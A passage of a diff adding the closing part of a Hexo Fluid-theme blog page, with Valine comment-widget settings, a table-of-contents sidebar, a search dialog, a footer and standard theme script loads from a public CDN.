+          {"appId":"sg2xM2g9UCt39D62pmfzcl8b-gzGzoHsz","appKey":"ludHhVlixZUIrJv11t6rmegp","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://icp.gov.moe/?keyword=20250279" target="_blank">萌ICP备20250279号</a> <br> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <br> <a target="_blank" rel="nofollow noopener"><span>待到山花烂漫时，她在丛中笑。</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
